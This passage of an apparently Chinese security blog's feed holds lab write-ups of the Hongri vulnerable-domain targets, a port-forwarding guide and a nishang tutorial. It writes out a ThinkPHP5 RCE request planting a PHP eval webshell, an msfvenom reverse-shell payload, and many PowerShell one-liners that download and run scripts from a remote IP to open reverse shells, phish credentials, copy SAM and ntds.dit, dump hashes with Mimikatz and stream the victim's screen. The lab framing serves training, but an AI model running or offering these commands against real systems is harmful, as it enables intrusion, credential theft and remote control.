src="https://img-blog.csdnimg.cn/71a5a2143b904f888f72e0377c700df4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c2d3699f79ae4588a4c3b04a12b1bbbc.png" alt="在这里插入图片描述"></p><p>全部成功上线<br><img src="https://img-blog.csdnimg.cn/84af7d29c1e1458da791da059c67ee33.png" alt="在这里插入图片描述"><br>因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机五</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/</url>
    
    <content type="html"><![CDATA[<p>靶机下载地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a> win7（双网卡）： 192.168.1.18外网） 192.168.138.136（内网）</p><p>win2008:192.168.138.138</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/cdb27832fd441d1196bd02fd68ef7669.png" alt="img"></p><p>访问80看看，是TP5的站</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e6aab55b754bad5839a1a16ac3e150ae.png" alt="img"></p><p>关于tp5的漏洞利用方式请查看：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p><p>成功利用，并执行了命令</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e5084cd3b81e7729d2ccac9aaeda8e30.png" alt="img"></p><p>写入shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.1.18/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/8d05ff828389e196b6474663a23529d1.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/31e9a3f10c58458df56942d1e55abf5a.png" alt="img"></p><p>上线C2</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4ff44b5a7ad284d026c5afc7bec00c12.png" alt="img"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a134f7cc25adea0de6abe92284082f37.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7ebc284b872a9ad3d9830b080725ae1b.png" alt="img"></p><p>内网存活主机探测</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4a6179495f22f2c78e13e0aacc25cda7.png" alt="img"></p><p>查看域控</p><p><img src="https://img-blog.csdnimg.cn/img_convert/77ebaadbac841153ba66be1ffd8e45cd.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/67d88860713a334ebd15cf640d0a46b4.png" alt="img"></p><p>现在已经是管理员权限了可以直接抓下密码看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f098aec95f905f48cd3120f9cd43c5b5.png" alt="img"></p><p>上链路进行横向</p><p><img src="https://img-blog.csdnimg.cn/img_convert/95d6852e550de119d7975b72dba1fc95.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c3805db9f3f23701c7c022a61ffde7c1.png" alt="img"></p><p>生成载荷上传到目标机器</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a4d546dd2d508a9c50d74b37499a7813.png" alt="img"></p><p>批量上线DC不成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/00bc2d1a9f53873a37bb50155a6f8b8c.png" alt="img"></p><h3 id="因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口"><a href="#因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口" class="headerlink" title="**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**NetSh Advfirewall set allprofiles state off ，或者添加规则来放行5555端口"></a>**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**<strong>NetSh Advfirewall set allprofiles state off</strong> <strong>，或者添加规则来放行5555端口</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">netsh advfirewall firewall add rule name=cs dir=<span class="hljs-keyword">in</span> action=allow protocol=<span class="hljs-variable constant_">TCP</span> localport=<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a72db8603f4c92b6d98b876f78f3bc60.png" alt="img"></p><p>最后全部上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9950cf5a36cc4583a8e87e1cf170f79a.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机二</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/</url>
    
    <content type="html"><![CDATA[<p>大致拓扑图如下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/21c348e08f5e752ffee5af89947802e5.png" alt="img"></p><p>web win server2008(10.0.10.80,192.168.1.16)</p><p>pc win7(10.10.10.201)</p><p>dc win server2012(10.10.10.10)</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>端口探测</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b13c45147a2fd61e4dbbeacab0189e55.png" alt="img"></p><p>发现有7001端口，可能存在weblogic</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bace8cafaf8e3d4fec26a9538574d190.png" alt="img"></p><p>确实存在探测下目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5b3b8328ce73972d298adf6c85900c62.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c1d2181c1aa7ffcd3751ae4c43451bf5.png" alt="img"></p><p>弱口令无果，尝试用工具利用</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a3a5af53ac2478bc23de5ab26636fa1c.png" alt="img"></p><p>存在漏洞并且返回了用户名</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cc5851bb4ac943e6b6d33a5ea14b3a41.png" alt="img"></p><p>能成功执行命令，我这里就直接上传webshell。</p><p>关于weblogic上传路径问题请参考：<a href="https://www.cnblogs.com/sstfy/p/10350915.html">https://www.cnblogs.com/sstfy/p/10350915.html</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/53867b96c29672a39361edf8764e154d.png" alt="img"></p><p>因为这里目标机有杀软上传普通马子会被连不上，所以我这里直接用冰歇的马子</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2ca9e8932ad8f53364887e2ebc501cf.png" alt="img"></p><p>为了方便操作弹个shell到c2上</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2f4c912c8d6c6eebf87fdf282063d0e8.png" alt="img"></p><p>提下权（我这里用的ms15-051）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/20312a2c486a5fe59df0b74be5abeae3.png" alt="img"></p><p>信息收集一波</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d3ad83ed6fec1eb87f4bf86a44c184c0.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5f4d039aa2c2621edace7efd02856d6a.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c7b1be12aa461ce700011c9e9a8a7a78.png" alt="img"></p><p>基本可判断域控主机为10.10.10.10</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b61cc4ebe004a2f47b77a28d2531dead.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8265b93a6cd10ade7ccc2865eaf8adc9.png" alt="img"></p><p>看一下内网主机存活情况</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d87c74c850eced71a950ddc95e7f3e8d.png" alt="img"></p><p>抓下密码进行横向</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7b611ac7288cbc7c56b179fe70b514c8.png" alt="img"></p><p>这里由于目标机不出网，这里做链路上线。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/555c4f270a2ce4c42583d6947ab1f9ec.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/84edafdbf24f859eb716c2471a7c285a.png" alt="img"></p><p>生成载荷上传目标机并执行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b912f6ed38ec92dba3b2e300cc7a3bc2.png" alt="img"></p><p>利用抓取得凭证进行批量上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c5f88efc494bf972b8067abadc58f052.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="netsh的基本使用（需要有admin权限）"><a href="#netsh的基本使用（需要有admin权限）" class="headerlink" title="netsh的基本使用（需要有admin权限）"></a>netsh的基本使用（需要有admin权限）</h2><p>通过做端口映射访问内网主机<br><strong>做映射</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941     <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p>其中listenaddress是我们监听的地址<br>listenport是监听端口<br>connectaddress 是连接地址</p><p>还可以这样写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=14941 <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p><strong>使用下面命令进行查看端口</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">v4tov4</span><br></code></pre></td></tr></table></figure><p><strong>取消端口转发：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941<br></code></pre></td></tr></table></figure><p><strong>清除所有规则</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></td></tr></table></figure><h2 id="MSF利用netsh转发"><a href="#MSF利用netsh转发" class="headerlink" title="MSF利用netsh转发"></a>MSF利用netsh转发</h2><p><img src="https://img-blog.csdnimg.cn/202107161602153.png" alt="在这里插入图片描述"><br>在msf中生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.10.153 <span class="hljs-attribute">lport</span>=4455 -f exe &gt; one.exe  <br></code></pre></td></tr></table></figure><p>在A服务器上使用netsh做转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=4455 <span class="hljs-attribute">connectaddress</span>=192.168.0.135 <span class="hljs-attribute">connectport</span>=4455<br></code></pre></td></tr></table></figure><p>在kali中设置监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use windows/multi/handler<br><span class="hljs-keyword">set</span> windows/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.0.135</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4455</span><br></code></pre></td></tr></table></figure><h2 id="cobaltstrike利用netsh转发"><a href="#cobaltstrike利用netsh转发" class="headerlink" title="cobaltstrike利用netsh转发"></a>cobaltstrike利用netsh转发</h2><p><img src="https://img-blog.csdnimg.cn/20210716164544443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="msf下的端口转发"><a href="#msf下的端口转发" class="headerlink" title="msf下的端口转发"></a>msf下的端口转发</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span>   add -l <span class="hljs-number">8080</span> r <span class="hljs-number">192.168.1.1</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>将本地8080端口的请求转发到远端的80端口上</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nishang学习</title>
    <link href="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="nishang模块及其功能"><a href="#nishang模块及其功能" class="headerlink" title="nishang模块及其功能"></a>nishang模块及其功能</h2><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Antak-Webshell</td><td>webshell</td></tr><tr><td>Backdoors</td><td>后门</td></tr><tr><td>Client</td><td>客户端</td></tr><tr><td>Escalation</td><td>提权</td></tr><tr><td>Execution</td><td>RCE</td></tr><tr><td>Gather</td><td>信息收集</td></tr><tr><td>Misc</td><td>杂项</td></tr><tr><td>Pivot</td><td>跳板&#x2F;远程控制  EXE</td></tr><tr><td>Scan</td><td>扫描</td></tr><tr><td>powerpreter</td><td>Meterreter会话</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li><p><strong>Check-VM</strong><br>检查是否为虚拟机</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span><span class="hljs-comment">;Check-VM</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a8c4241ddad848699962dfb7eca88b9e.png" alt="在这里插入图片描述"></p></li><li><p><strong>Invoke-CredentialsPhish</strong><br>欺骗目标主机用户，让用户输入密码。</p></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d89b62b0e86241518ba52dbac9ead982.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>输入密码弹框才会消失<br><img src="https://img-blog.csdnimg.cn/15603ca1555047878f791498efd0eedf.png" alt="在这里插入图片描述"></p><ul><li><strong>Copy-VSS</strong><br>这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和system hive也能被拷贝出来</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;copy-vss -DestinationDir c:/  <br><span class="hljs-regexp">//</span>copy-vss  <span class="hljs-comment">#把文件保存到当前路径下</span><br><span class="hljs-regexp">//</span>copy-vss -DestinationDir c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure><ul><li><strong>FireBuster  FireListener扫描器</strong><br>对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span>-<span class="hljs-number">150</span><br><span class="hljs-comment">#接着输入如下命令</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168.43.161</span> <span class="hljs-number">130</span>-<span class="hljs-number">150</span> -Verbose<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f8a75adc51744a689648b3ba4de094f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke Mimikatz</strong></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">nvoke-Mimikatz  -DumpCerts    ##Dump出本机的凭证信息<br>Invoke-Mimikatz  -DumpCerts   -ComputerName @（“computer1”，“computer2”） ##Dump 出远程的两台计算机的凭证信息<br>Invoke-Mimikatz  -Command <span class="hljs-string">&quot;privillage::debug exit&quot;</span> -ComputerName <span class="hljs-string">&quot;computer1&quot;</span> ##在远程的一台机器上运行Mimikatz并执行 <span class="hljs-string">&quot;privillage::debug exit&quot;</span><br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;Invoke-Mimikatz  -DumpCerts  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c1ec5aea440749fb942f76562b454811.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><p><strong>Get-PassHashes</strong><br>需administrator权限</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1b5310571bf5485d8892b11ea5e35434.png" alt="在这里插入图片描述"></p></li><li><p><strong>Get-PassHints</strong><br>获取用户的密码提示信息，需administrator权限，可根据提示信息生成密码字典提高爆破成功几率</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHints</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e3b3991b57c34bbe8aa4e108c917677c.png" alt="在这里插入图片描述"></p></li><li><p><strong>Invoke-PortScan</strong></p></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>StartAddress</td><td>扫描范围开始的地址</td></tr><tr><td>EndAddress</td><td>扫描范围结束的地址</td></tr><tr><td>ScanPort</td><td>进行端口扫描</td></tr><tr><td>Port</td><td>执行端口，有默认端口</td></tr><tr><td>Timout</td><td>超时时间</td></tr><tr><td>ResolveHost</td><td>存活主机并解析主机名</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; Invoke-PortScan -StartAddress <span class="hljs-number">192.168.43.1</span> -EndAddress <span class="hljs-number">192.168.43.50</span> -ResolveHost  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/712e69666696412eb16eb47c1abbc4d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-BruteForce</strong><br>对SQL Server，域控制器(ActiveDirectory)，web以及ftp弱口令爆破</li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>ComputerName</td><td>对应服务的计算机名</td></tr><tr><td>UserList</td><td>用户名字典</td></tr><tr><td>PasswordList</td><td>密码字典</td></tr><tr><td>Service</td><td>服务  默认为sql服务</td></tr><tr><td>Delay</td><td>延迟时间</td></tr><tr><td>StopOnSucess</td><td>匹配一个后停止</td></tr></tbody></table><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">BruteForce</span> <span class="hljs-operator">-</span><span class="hljs-variable">ComputerName</span> <span class="hljs-variable">WEB</span> <span class="hljs-operator">-</span><span class="hljs-variable">UserList</span>  <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">PasswordList</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">Service</span> <span class="hljs-variable">FTP</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure><ul><li><strong>屏幕窃取</strong><br>Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Show</span>-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">443</span>  #Reverse反向连接 Bind  正向连接<br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;Show-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br><span class="hljs-attribute">nc</span> -nlvp <span class="hljs-number">1111</span>| nc -nlvp <span class="hljs-number">9999</span>   #访问本机<span class="hljs-number">9999</span>端口即可<br></code></pre></td></tr></table></figure><h2 id="powershell-隐藏通信隧道"><a href="#powershell-隐藏通信隧道" class="headerlink" title="powershell 隐藏通信隧道"></a>powershell 隐藏通信隧道</h2><ul><li>I<strong>nvoke-PowershellTcp</strong></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>IPAddress</td><td>选择-Reverse选项时表示需要连接的IP地址</td></tr><tr><td>Port<int32></td><td>选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口</td></tr><tr><td>Reverse</td><td>反向连接</td></tr><tr><td>Bind</td><td>正向连接</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#反向</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br><span class="hljs-attribute">nc</span> -nv <span class="hljs-number">192.168.1.1</span>  <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp  -Bind  -Port <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0d10bf1ddf1a400b943c0a000bb2652a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-PowershellUdp</strong></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">正向：nc -nvu <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc -lup <span class="hljs-number">3333</span><br><br><br>powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-PowerShellUdp -Reverse -IPAddress 1.116.233.115 -Port 3333</span><br></code></pre></td></tr></table></figure><p><img 